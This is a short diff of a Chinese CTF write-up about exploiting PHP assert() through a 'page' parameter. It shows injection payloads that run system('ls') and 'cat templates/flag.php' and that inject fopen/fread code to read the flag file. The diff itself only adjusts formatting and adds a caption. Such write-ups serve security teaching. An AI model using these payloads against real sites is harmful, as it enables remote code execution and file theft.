@@ -62,11 +62,11 @@ assert("strpos('flag'.system("ls").'.php', '..') === false") or die("Detected ha
 下面是几种方式：
 
 (1) ?page=flag'.system("cat templates/flag.php").'
+第一个assert变成：
 ~~~~
 assert("strpos('templates/flag'.system("cat templates/flag.php").'.php', '..') === false") or die("Detected hacking attempt!");
 ~~~~
-(2) 
-~~~~
+(2) ~~~~
 ?page=', '..') === false and $myfile = fopen("templates/flag.php", "r") and exit(fread($myfile,filesize("templates/flag.php"))) or true or strpos('
 ~~~~
 ~~~~
